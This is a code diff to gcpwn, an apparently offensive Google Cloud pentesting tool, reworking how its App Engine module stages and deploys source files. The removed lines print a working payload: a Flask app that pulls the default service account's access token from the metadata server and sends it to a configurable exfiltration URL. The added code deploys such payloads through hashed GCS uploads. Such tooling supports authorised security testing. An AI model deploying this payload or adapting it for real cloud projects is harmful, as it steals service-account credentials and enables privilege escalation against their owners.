@@ -1,7 +1,6 @@
 from __future__ import annotations
 
-import io
-import zipfile
+import hashlib
 from typing import Any, Iterable
 
 from gcpwn.core.utils.action_recording import record_permissions
@@ -9,87 +8,17 @@ from gcpwn.core.utils.module_helpers import extract_path_segment, extract_path_t
 from gcpwn.core.utils.persistence import save_to_table
 from gcpwn.core.utils.serialization import field_from_row, resource_to_dict
 from gcpwn.core.utils.service_runtime import handle_service_error
-
-# Template for the stub GAE handler.
-# __EXFIL__ → repr(exfil_url), __TRIGGER_PATH__ → repr(trigger_path)
-_GAE_MAIN_PY = """\
-import json
-import os
-import urllib.request
-
-from flask import Flask, request, abort
-
-app = Flask(__name__)
-_EXFIL_URL = __EXFIL__
-_TRIGGER_PATH = __TRIGGER_PATH__
-_MARKER_TOKEN = "GCPWN_GAE_TOKEN="
-_MARKER_EMAIL = "GCPWN_GAE_EMAIL="
+from gcpwn.modules.gcp.appengine.utilities.exploit_payloads import build_gae_source_files  # noqa: F401
 
 
-def _meta(path):
-    req = urllib.request.Request(
-        f"http://metadata.google.internal/computeMetadata/v1/{path}",
-        headers={"Metadata-Flavor": "Google"},
-    )
-    return urllib.request.urlopen(req, timeout=5).read().decode()
-
-
-@app.route(_TRIGGER_PATH)
-@app.route("/_ah/health")
-def index():
-    if request.path == "/_ah/health":
-        return "ok", 200
-    try:
-        token = json.loads(_meta("instance/service-accounts/default/token")).get("access_token", "")
-        email = _meta("instance/service-accounts/default/email")
-        print(f"{_MARKER_EMAIL}{email}", flush=True)
-        print(f"{_MARKER_TOKEN}{token}", flush=True)
-        if _EXFIL_URL:
-            exfil_req = urllib.request.Request(
-                _EXFIL_URL, headers={"Authorization": f"Bearer {token}"}
-            )
-            urllib.request.urlopen(exfil_req, timeout=10)
-        return token, 200
-    except Exception as exc:
-        return f"err {exc}", 500
-
-
-@app.route("/", defaults={"path": ""})
-@app.route("/<path:path>")
-def catch_all(path):
-    abort(404)
-
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
-"""
-
-
-def build_gae_source_zip(exfil_url: str, trigger_path: str = "/") -> bytes:
-    """Return ZIP bytes containing a minimal GAE stub that exfils the metadata token."""
-    main_py = _GAE_MAIN_PY.replace("__EXFIL__", repr(exfil_url)).replace(
-        "__TRIGGER_PATH__", repr(trigger_path)
-    )
-    app_yaml = "runtime: python312\nentrypoint: python3 main.py\n"
-    requirements_txt = "Flask==3.1.3\n"
-    buf = io.BytesIO()
-    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr("main.py", main_py)
-        zf.writestr("app.yaml", app_yaml)
-        zf.writestr("requirements.txt", requirements_txt)
-    return buf.getvalue()
-
-
-def stage_zip_to_gcs(
+def stage_files_to_gcs(
     session,
     *,
     project_id: str,
     bucket_id: str,
-    obj_name: str,
-    zip_bytes: bytes,
-    target_sa: str | None = None,
-) -> str:
-    """Upload zip_bytes to GCS bucket (created if missing). Returns https:// URL."""
+    files: dict[str, bytes],
+) -> dict[str, dict]:
+    """Upload each file by its SHA1 hash (gcloud-style). Returns {filename: {sha1Sum, sourceUrl}}."""
     from google.cloud import storage as _gcs
     from google.api_core.exceptions import Conflict
 
@@ -100,9 +29,17 @@ def stage_zip_to_gcs(
             bucket = gcs.create_bucket(bucket_id, location="US")
         except Conflict:
             bucket = gcs.bucket(bucket_id)
-    blob = bucket.blob(obj_name)
-    blob.upload_from_string(zip_bytes, content_type="application/zip")
-    return f"https://storage.googleapis.com/{bucket_id}/{obj_name}"
+    result = {}
+    for filename, content in files.items():
+        sha1 = hashlib.sha1(content).hexdigest()
+        blob = bucket.blob(sha1)
+        if not blob.exists():
+            blob.upload_from_string(content, content_type="application/octet-stream")
+        result[filename] = {
+            "sha1Sum": sha1,
+            "sourceUrl": f"https://storage.googleapis.com/{bucket_id}/{sha1}",
+        }
+    return result
 
 
 class _AppEngineBaseResource:
@@ -344,12 +281,19 @@ class AppEngineVersionsResource(_AppEngineBaseResource):
         service_id: str,
         version_id: str,
         service_account: str,
-        source_url: str,
+        deployment_files: dict,
         serving_status: str = "STOPPED",
     ) -> dict:
         from google.cloud.appengine_admin_v1.types.version import ServingStatus
         status_map = {"STOPPED": ServingStatus.STOPPED, "SERVING": ServingStatus.SERVING}
         parent = f"apps/{project_id}/services/{service_id}"
+        files_map = {
+            fname: self._appengine_admin_v1.FileInfo(
+                source_url=info["sourceUrl"],
+                sha1_sum=info["sha1Sum"],
+            )
+            for fname, info in deployment_files.items()
+        }
         version = self._appengine_admin_v1.Version(
             id=version_id,
             runtime="python312",
@@ -359,9 +303,7 @@ class AppEngineVersionsResource(_AppEngineBaseResource):
             # Manual scaling is required to allow serving_status to be toggled
             # after deployment (automatic scaling versions ignore serving_status updates).
             manual_scaling=self._appengine_admin_v1.ManualScaling(instances=1),
-            deployment=self._appengine_admin_v1.Deployment(
-                zip_=self._appengine_admin_v1.ZipInfo(source_url=source_url)
-            ),
+            deployment=self._appengine_admin_v1.Deployment(files=files_map),
             entrypoint=self._appengine_admin_v1.Entrypoint(shell="gunicorn -b :$PORT main:app"),
         )
         request = self._appengine_admin_v1.CreateVersionRequest(parent=parent, version=version)
